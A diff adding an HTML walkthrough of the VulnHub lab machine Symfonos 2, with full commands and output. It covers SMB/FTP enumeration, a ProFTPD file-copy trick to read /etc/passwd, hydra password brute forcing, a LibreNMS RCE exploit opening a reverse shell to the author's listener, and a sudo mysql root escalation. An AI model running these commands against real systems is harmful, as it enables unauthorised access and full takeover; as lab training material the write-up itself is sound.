@@ -1,0 +1,176 @@
+---
+layout: default
+---
+<html>
+<head>
+    <title>Symfonos 2 Walkthrough</title>
+    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
+</head>
+
+<body>
+
+    <h1>Symfonos 2 Walkthrough</h1>
+
+    <hr>
+
+    <h2>Contents</h2>
+    <ul>
+        <li><a href="#summary">Summary</a></li>
+        <li><a href="#portscan">Port Scanning</a></li>
+        <li><a href="#infogather">Information Gathering</a></li>
+        <li><a href="#aeolus">Shell - aeolus</a></li>
+        <li><a href="#cronos">Shell - cronos</a></li>
+        <li><a href="#root">Shell - root</a></li>
+    </ul>
+
+
+    <h2><a id="summary">Summary</a></h2>
+
+    <p>The SMB server contains a file called "log.txt".  This log file contains SMB share configuration settings and reveals the username aeolus.  We bruteforce the password for aeolus using ftp and login through SSH using those same credentials.  Once on the box we find a web server hosting LibreNMS listening internally on port 8080.  We forward this to our box and are able to login to LibreNMS using the credentaisl for aeolus.  There is an authenticated RCE expoit on searchsploit that works.  We need to intercept server responses to to troubleshoot the exploit to get it to work.  We gain shell access for the user cronos.  Cronos has sudo right to the command "mysql".  GTFObins contains a privesc command thats gives us a root shell.</p>
+
+    <h2><a id="portscan">Port Scanning</a></h2>
+
+    <li>Running a port scan against the full port range to determine which ones are open.</li>
+
+    <pre>
+# Nmap 7.91 scan initiated Mon Sep 20 16:38:23 2021 as: nmap -p- -oN ping_tcp 10.0.0.14&#13;&#10;Nmap scan report for 10.0.0.14&#13;&#10;Host is up (0.000064s latency).&#13;&#10;Not shown: 65530 closed ports&#13;&#10;PORT    STATE SERVICE&#13;&#10;21/tcp  open  ftp&#13;&#10;22/tcp  open  ssh&#13;&#10;80/tcp  open  http&#13;&#10;139/tcp open  netbios-ssn&#13;&#10;445/tcp open  microsoft-ds&#13;&#10;MAC Address: 00:0C:29:3F:52:32 (VMware)&#13;&#10;&#13;&#10;# Nmap done at Mon Sep 20 16:38:31 2021 -- 1 IP address (1 host up) scanned in 7.96 seconds
+    </pre>
+
+    <li>Running an nmap scan using the flags -sV and -sC to enumerate service versions and other information.</li>
+
+    <pre>
+# Nmap 7.91 scan initiated Mon Sep 20 16:46:38 2021 as: nmap -p21,22,80,139,445 -sV -sC -oN script_tcp 10.0.0.14&#13;&#10;Nmap scan report for 10.0.0.14&#13;&#10;Host is up (0.00020s latency).&#13;&#10;&#13;&#10;PORT    STATE SERVICE     VERSION&#13;&#10;21/tcp  open  ftp         ProFTPD 1.3.5&#13;&#10;22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)&#13;&#10;| ssh-hostkey: &#13;&#10;|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)&#13;&#10;|   256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)&#13;&#10;|_  256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)&#13;&#10;80/tcp  open  http        WebFS httpd 1.21&#13;&#10;|_http-server-header: webfs/1.21&#13;&#10;|_http-title: Site doesn&apos;t have a title (text/html).&#13;&#10;139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)&#13;&#10;445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)&#13;&#10;MAC Address: 00:0C:29:3F:52:32 (VMware)&#13;&#10;Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel&#13;&#10;&#13;&#10;Host script results:&#13;&#10;|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s&#13;&#10;|_nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)&#13;&#10;| smb-os-discovery: &#13;&#10;|   OS: Windows 6.1 (Samba 4.5.16-Debian)&#13;&#10;|   Computer name: symfonos2&#13;&#10;|   NetBIOS computer name: SYMFONOS2\x00&#13;&#10;|   Domain name: \x00&#13;&#10;|   FQDN: symfonos2&#13;&#10;|_  System time: 2021-09-20T15:46:56-05:00&#13;&#10;| smb-security-mode: &#13;&#10;|   account_used: guest&#13;&#10;|   authentication_level: user&#13;&#10;|   challenge_response: supported&#13;&#10;|_  message_signing: disabled (dangerous, but default)&#13;&#10;| smb2-security-mode: &#13;&#10;|   2.02: &#13;&#10;|_    Message signing enabled but not required&#13;&#10;| smb2-time: &#13;&#10;|   date: 2021-09-20T20:46:56&#13;&#10;|_  start_date: N/A&#13;&#10;&#13;&#10;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&#13;&#10;# Nmap done at Mon Sep 20 16:47:11 2021 -- 1 IP address (1 host up) scanned in 33.47 seconds
+    </pre>
+
+    <h2><a id="infogather">Information Gathering</a></h2>
+
+    <li>We start off with enumeration of the SMB server.  First we find that we have read access to the share "anonymous".</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/symfonos_2]&#13;&#10;&boxur;&HorizontalLine;$ smbmap -H 10.0.0.14                 &#13;&#10;[+] Guest session   &#9;IP: 10.0.0.14:445&#9;Name: 10.0.0.14                                         &#13;&#10;        Disk                                                  &#9;Permissions&#9;Comment&#13;&#10;&#9;----                                                  &#9;-----------&#9;-------&#13;&#10;&#9;print$                                            &#9;NO ACCESS&#9;Printer Drivers&#13;&#10;&#9;anonymous                                         &#9;READ ONLY&#9;&#13;&#10;&#9;IPC$                                              &#9;NO ACCESS&#9;IPC Service (Samba 4.5.16-Debian)
+    </pre>
+
+    <li>There is a file called "log.txt" in this share.  We download it.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/symfonos_2]&#13;&#10;&boxur;&HorizontalLine;$ smbclient //10.0.0.14/anonymous&#13;&#10;Enter WORKGROUP\kali&apos;s password: &#13;&#10;Try &quot;help&quot; to get a list of possible commands.&#13;&#10;smb: \&gt; ls&#13;&#10;  .                                   D        0  Tue Sep 21 16:03:54 2021&#13;&#10;  ..                                  D        0  Tue Sep 21 11:19:42 2021&#13;&#10;  backups                             D        0  Thu Jul 18 10:25:17 2019&#13;&#10;&#13;&#10;&#9;&#9;19728000 blocks of size 1024. 16301072 blocks available&#13;&#10;smb: \&gt; cd backups&#13;&#10;smb: \backups\&gt; ls&#13;&#10;  .                                   D        0  Thu Jul 18 10:25:17 2019&#13;&#10;  ..                                  D        0  Tue Sep 21 16:03:54 2021&#13;&#10;  log.txt                             N    11394  Thu Jul 18 10:25:16 2019&#13;&#10;&#13;&#10;&#9;&#9;19728000 blocks of size 1024. 16301072 blocks available&#13;&#10;smb: \backups\&gt; get log.txt&#13;&#10;getting file \backups\log.txt of size 11394 as log.txt (5563.2 KiloBytes/sec) (average 5563.5 KiloBytes/sec)&#13;&#10;smb: \backups\&gt; 
+    </pre>
+
+    <li>The contents of "log.txt" show us information about the SMB shares.  One key piece of information it reveals is that the "anonymous" share is located in /home/aeolus/share.</li>
+
+    <pre>
+[anonymous]
+   path = /home/aeolus/share
+   browseable = yes
+   read only = yes
+   guest ok = yes
+    </pre>
+
+    <li>In conjunction with ProFTP this gives us the ability to read /etc/passwd.  ProFTP gives us the ability to copy files to and from anywhere on the remote machine that it has permissions to under the context of whichever user is running it.</li>
+
+    <pre>
+        &boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/symfonos_2]&#13;&#10;        &boxur;&HorizontalLine;$ ftp 10.0.0.14  &#13;&#10;        Connected to 10.0.0.14.&#13;&#10;        220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.0.0.14]&#13;&#10;        Name (10.0.0.14:kali): anonymous&#13;&#10;        500 AUTH not understood&#13;&#10;        500 AUTH not understood&#13;&#10;        SSL not available&#13;&#10;        331 Anonymous login ok, send your complete email address as your password&#13;&#10;        Password:&#13;&#10;        530 Login incorrect.&#13;&#10;        Login failed.&#13;&#10;        Remote system type is UNIX.&#13;&#10;        Using binary mode to transfer files.&#13;&#10;        ftp&gt; site cpfr /etc/passwd&#13;&#10;        350 File or directory exists, ready for destination name&#13;&#10;        ftp&gt; site cpto /home/aeolus/share/passwd&#13;&#10;        250 Copy successful&#13;&#10;        ftp&gt; exit&#13;&#10;        221 Goodbye.&#13;&#10;                                                                                                                             &#13;&#10;        &boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/symfonos_2]&#13;&#10;        &boxur;&HorizontalLine;$ smbclient //10.0.0.14/anonymous&#13;&#10;        Enter WORKGROUP\kali&apos;s password: &#13;&#10;        Try &quot;help&quot; to get a list of possible commands.&#13;&#10;        smb: \&gt; ls&#13;&#10;          .                                   D        0  Tue Sep 21 16:17:10 2021&#13;&#10;          ..                                  D        0  Tue Sep 21 11:19:42 2021&#13;&#10;          passwd                              N     1614  Tue Sep 21 16:17:10 2021&#13;&#10;          backups                             D        0  Thu Jul 18 10:25:17 2019&#13;&#10;        &#13;&#10;                19728000 blocks of size 1024. 16301060 blocks available&#13;&#10;        smb: \&gt;         
+    </pre>
+
+    <li>In the end, all this does for us is tell us that another user on the box is named cronus in addition to root.  We already know aeolus is a user based on the share path of /home/aerolus/share.</li>
+
+    <br>
+
+    <h2><a id="aeolus">Shell - aeolus</a></h2>
+
+    <li>We gain our foothold on this box by bruteforcing the password for the user aeolus.  In order to do this we use Hydra.  Initially I tried bruteforcing SSH but that kept on locking me out.  FTP did not lock me out and did end up correctly identifying the SSH password for aeolus.</li>
+    <ul>
+        <li>The hydra command I used: hydra -l aeolus -P /usr/share/wordlists/rockyou.txt ftp://10.0.0.14</li>
+    </ul>
+    <li>This brute forcing took a long time.  aeolus's password is on line 25076 of the rockyou.txt file, unfortunately.</li>
+
+    <br>
+
+    <li>Hydra finishes and we end up with the creds aeolus:sergioteamo.  We login to SSH using these.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/symfonos_2]&#13;&#10;&boxur;&HorizontalLine;$ sshpass -p sergioteamo ssh aeolus@10.0.0.14                                                                127 &Cross;&#13;&#10;Linux symfonos2 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64&#13;&#10;&#13;&#10;The programs included with the Debian GNU/Linux system are free software;&#13;&#10;the exact distribution terms for each program are described in the&#13;&#10;individual files in /usr/share/doc/*/copyright.&#13;&#10;&#13;&#10;Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent&#13;&#10;permitted by applicable law.&#13;&#10;You have mail.&#13;&#10;Last login: Tue Sep 21 13:23:15 2021 from 10.0.0.1&#13;&#10;aeolus@symfonos2:~$ 
+    </pre>
+
+    <li>I ran linpeas.sh on this box and it did not tell me what ports were listening on the box.  However, it did tell me that nmap is on the box.  So I used nmap to enumerate all the ports that were listening on the box to see if there is anything that I was not able to detect externally from the nmap scan I did from my Kali machine.  I used the same port scanning methodology as I used from my Kali box.</li>
+
+    <br>
+
+    <li>First I scanned the full port range to determine which ports are open</li>
+
+    <pre>
+# Nmap 7.40 scan initiated Tue Sep 21 15:49:54 2021 as: nmap -p- -oN /tmp/ping_tcp 127.0.0.1&#13;&#10;Nmap scan report for localhost (127.0.0.1)&#13;&#10;Host is up (0.000019s latency).&#13;&#10;Not shown: 65527 closed ports&#13;&#10;PORT     STATE SERVICE&#13;&#10;21/tcp   open  ftp&#13;&#10;22/tcp   open  ssh&#13;&#10;25/tcp   open  smtp&#13;&#10;80/tcp   open  http&#13;&#10;139/tcp  open  netbios-ssn&#13;&#10;445/tcp  open  microsoft-ds&#13;&#10;3306/tcp open  mysql&#13;&#10;8080/tcp open  http-proxy&#13;&#10;&#13;&#10;# Nmap done at Tue Sep 21 15:49:54 2021 -- 1 IP address (1 host up) scanned in 0.35 seconds
+    </pre>
+
+    <li>Then I directed my scan at those open ports while using the -sV and -sC flags to enumerate more information about them</li>
+
+    <pre>
+# Nmap 7.40 scan initiated Tue Sep 21 15:50:34 2021 as: nmap -p21,22,25,80,139,445,3306,8080 -sV -sC -oN script_tcp 127.0.0.1&#13;&#10;Nmap scan report for localhost (127.0.0.1)&#13;&#10;Host is up (0.00033s latency).&#13;&#10;PORT     STATE SERVICE     VERSION&#13;&#10;21/tcp   open  ftp         ProFTPD 1.3.5&#13;&#10;22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)&#13;&#10;| ssh-hostkey: &#13;&#10;|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)&#13;&#10;|_  256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)&#13;&#10;25/tcp   open  smtp        Exim smtpd 4.89&#13;&#10;| smtp-commands: symfonos2 Hello localhost [127.0.0.1], SIZE 52428800, 8BITMIME, PIPELINING, PRDR, HELP, &#13;&#10;|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP &#13;&#10;80/tcp   open  http        WebFS httpd 1.21&#13;&#10;|_http-server-header: webfs/1.21&#13;&#10;|_http-title: Site doesn&apos;t have a title (text/html).&#13;&#10;139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)&#13;&#10;445/tcp  open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)&#13;&#10;3306/tcp open  mysql       MySQL 5.5.5-10.1.38-MariaDB-0+deb9u1&#13;&#10;| mysql-info: &#13;&#10;|   Protocol: 10&#13;&#10;|   Version: 5.5.5-10.1.38-MariaDB-0+deb9u1&#13;&#10;|   Thread ID: 30&#13;&#10;|   Capabilities flags: 63487&#13;&#10;|   Some Capabilities: IgnoreSigpipes, LongColumnFlag, Support41Auth, SupportsLoadDataLocal, FoundRows, Speaks41ProtocolOld, Speaks41ProtocolNew, SupportsTransactions, InteractiveClient, ODBCClient, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsCompression, LongPassword, IgnoreSpaceBeforeParenthesis, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults&#13;&#10;|   Status: Autocommit&#13;&#10;|   Salt: *UMc*CSYE+Ilf;41:m7i&#13;&#10;|_  Auth Plugin Name: 103&#13;&#10;8080/tcp open  http        Apache httpd 2.4.25 ((Debian))&#13;&#10;| http-open-proxy: Potentially OPEN proxy.&#13;&#10;|_Methods supported:CONNECTION&#13;&#10;| http-robots.txt: 1 disallowed entry &#13;&#10;|_/&#13;&#10;|_http-server-header: Apache/2.4.25 (Debian)&#13;&#10;|_http-title: Did not follow redirect to http://localhost/login&#13;&#10;Service Info: Host: symfonos2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel&#13;&#10;&#13;&#10;Host script results:&#13;&#10;|_nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)&#13;&#10;| smb-os-discovery: &#13;&#10;|   OS: Windows 6.1 (Samba 4.5.16-Debian)&#13;&#10;|   Computer name: symfonos2&#13;&#10;|   NetBIOS computer name: SYMFONOS2\x00&#13;&#10;|   Domain name: \x00&#13;&#10;|   FQDN: symfonos2&#13;&#10;|_  System time: 2021-09-21T15:50:46-05:00&#13;&#10;| smb-security-mode: &#13;&#10;|   account_used: guest&#13;&#10;|   authentication_level: user&#13;&#10;|   challenge_response: supported&#13;&#10;|_  message_signing: disabled (dangerous, but default)&#13;&#10;|_smbv2-enabled: Server supports SMBv2 protocol&#13;&#10;&#13;&#10;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&#13;&#10;# Nmap done at Tue Sep 21 15:50:56 2021 -- 1 IP address (1 host up) scanned in 21.61 seconds
+    </pre>
+
+    <li>Mysql on port 3306 and the web server on port 8080 did not show up when I scanned from my Kali box so these ones are interesting.  Using SSH, I forwarded port 8080 to port 800 on my Kali machine</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/symfonos_2]&#13;&#10;&boxur;&HorizontalLine;$ sshpass -p sergioteamo ssh aeolus@10.0.0.14 -f -N -L 800:localhost:8080
+    </pre>
+
+    <h2><a id="cronos">Shell - cronos</a></h2>
+
+    <li>When I visit the web page it gives a logon screen for LibreNMS</li>
+
+    <img src="../images/symfonos_2/librenms.png">
+
+    <br>
+    <br>
+
+    <li>We are able to login here by reusing the credentials aeolus:sergioteamo.  When we check searchsploit for any exploits for LibreNMS we find a few.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/symfonos_2]&#13;&#10;&boxur;&HorizontalLine;$ searchsploit librenms&#13;&#10;----------------------------------------------------------------------------------- ---------------------------------&#13;&#10; Exploit Title                                                                     |  Path&#13;&#10;----------------------------------------------------------------------------------- ---------------------------------&#13;&#10;LibreNMS - addhost Command Injection (Metasploit)                                  | linux/remote/46970.rb&#13;&#10;LibreNMS - Collectd Command Injection (Metasploit)                                 | linux/remote/47375.rb&#13;&#10;LibreNMS 1.46 - &apos;addhost&apos; Remote Code Execution                                    | php/webapps/47044.py&#13;&#10;LibreNMS 1.46 - &apos;search&apos; SQL Injection                                             | multiple/webapps/48453.txt&#13;&#10;LibreNMS 1.46 - MAC Accounting Graph Authenticated SQL Injection                   | multiple/webapps/49246.py&#13;&#10;----------------------------------------------------------------------------------- ---------------------------------&#13;&#10;Shellcodes: No Results
+    </pre>
+    
+    <li>I played with each exploit (except metasploit) but ended up using "LibreNMS 1.46 - 'addhost' Remote Code Execution".  This exploit creates a "device" on LibreNMS that contains a payload with a reverse shell command.  The exploit created the device successfully but it failed to execute the payload after creation.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/symfonos_2]&#13;&#10;&boxur;&HorizontalLine;$ python ./LibreNMS-exploit.py http://127.0.0.1:800 librenms_session=eyJpdiI6IjErNEU2ZjVzaXlYQ29rWUFMck9mWmc9PSIsInZhbHVlIjoibmtzb1E2eGExeWZMSGhkSVR4T0s2VjdGOUFGUWpyWlUwcFoxT0ZvZHN5azg1WXhwT0JqNFhcLzk0RXN4cjFnQW9aTTFyWEErRlZDOEY5TUJDdXdsNW9nPT0iLCJtYWMiOiI1MWYxOGIwZDg5MmZiYThjY2Y5ZWZkYjc0ZjM1MzQ1ZjFjMjgwM2Y5OWQwNzkxOTE2ZGFmZDRiZWRmMzAyNGZhIn0%3D 10.0.0.1 80  &#13;&#10;[+] Device Created Sucssfully
+    </pre>
+
+    <li>In order to see what was happening when the the script was attempting to execute the payload I intercepted the server requests using Burp.  In order to do this you go to Burp > Proxy > Options > Proxy Listeners > Edit 127.0.0.1:8080 > Request Handling > Redirect to host: 127.0.0.1 > Redirect to port: (forwarded port for syfonos2:8080)</li>
+
+    <img src="../images/symfonos_2/burp_intercept_settings.png")>
+
+    <br>
+    <br>
+
+    <li>Now I try the exploit again and observe what is happening when the script attempts to execute the payload..</li>
+
+    <img src="../images/symfonos_2/burp_response_unauthenticated.png">
+
+    <br>
+    <br>
+
+    <li>As we can see. the server is responding with "unauthenticated" when it attempts to execute the payload.  In order to fix this, I first remove the Burp settings that are forwarding requests from 8080 to LibreNMS.  These settings are no longer required.  Then, I browse to http://127.0.0.1:800/ajax_output.php?hostname=dummydevice2&type=snmpwalk&id=capture&format=text just like the exploit was attempting to do.  I also intercept this request with burp so that I can compare the differences between the request I am sending to the web server and the request that the exploit it sending to the web server.  It turns out that the exploit was not including the CSRF token so we were getting the "unauthenticated" message instead of executing the payload.  When we browse to that URL manually, the payload executes successfully.</li>
+
+    <br>
+
+    <li>Now I have a new shell as the user Cronos.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/symfonos_2]&#13;&#10;&boxur;&HorizontalLine;$ nc -lvnp 80                                                                                                130 &Cross;&#13;&#10;Ncat: Version 7.91 ( https://nmap.org/ncat )&#13;&#10;Ncat: Listening on :::80&#13;&#10;Ncat: Listening on 0.0.0.0:80&#13;&#10;Ncat: Connection from 10.0.0.14.&#13;&#10;Ncat: Connection from 10.0.0.14:34152.&#13;&#10;/bin/sh: 0: can&apos;t access tty; job control turned off&#13;&#10;$ python3 -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;);&quot;&#13;&#10;cronus@symfonos2:/opt/librenms/html$ export TERM=xterm&#13;&#10;export TERM=xterm&#13;&#10;cronus@symfonos2:/opt/librenms/html$ ^Z&#13;&#10;zsh: suspended  nc -lvnp 80&#13;&#10;                                                                                                                     &#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/symfonos_2]&#13;&#10;&boxur;&HorizontalLine;$ stty raw -echo;fg;                                                                                     148 &Cross; 1 &#9881;&#13;&#10;[1]  + continued  nc -lvnp 80
+    </pre>
+
+    <h2><a id="root">Shell - Root</a></h2>
+
+    <li>On cronos I run sudo -l and find I have sudo access to /usr/bin/mysql as the user root.</li>
+
+    <pre>
+cronus@symfonos2:/opt/librenms/html$ sudo -l&#13;&#10;Matching Defaults entries for cronus on symfonos2:&#13;&#10;    env_reset, mail_badpass,&#13;&#10;    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin&#13;&#10;&#13;&#10;User cronus may run the following commands on symfonos2:&#13;&#10;    (root) NOPASSWD: /usr/bin/mysql
+    </pre>
+
+    <li>I take a look at GTFOBins and it tells me that I can use the command "sudo mysql -e '\! /bin/sh'" to privesc to root.</li>
+
+    <pre>
+cronus@symfonos2:/opt/librenms/html$ sudo mysql -e &apos;\! /bin/sh&apos;&#13;&#10;# id&#13;&#10;uid=0(root) gid=0(root) groups=0(root)
+    </pre>
+
+    <li>Rooted.</li>
